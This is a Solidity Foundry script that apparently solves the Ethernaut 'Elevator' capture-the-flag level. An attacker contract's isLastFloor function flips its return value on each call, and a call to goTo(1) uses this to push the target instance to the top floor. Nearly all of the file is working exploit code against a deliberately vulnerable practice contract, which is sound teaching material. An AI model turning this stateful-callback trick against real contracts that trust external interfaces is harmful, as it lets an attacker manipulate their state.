//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
    Attack attack;

    function run() public {
        vm.startBroadcast();
        attack = new Attack( /* Your instance address */ );
        attack.solve();
        vm.stopBroadcast();
    }
}

contract Attack {
    bool top;
    address private immutable i_instance;

    constructor(address instance) {
        i_instance = instance;
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        bool aux = top;
        top = !top; // Switches the value of top.
        return aux;
    }

    function solve() external {
        i_instance.call(abi.encodeWithSignature("goTo(uint256)", 1));
    }
}
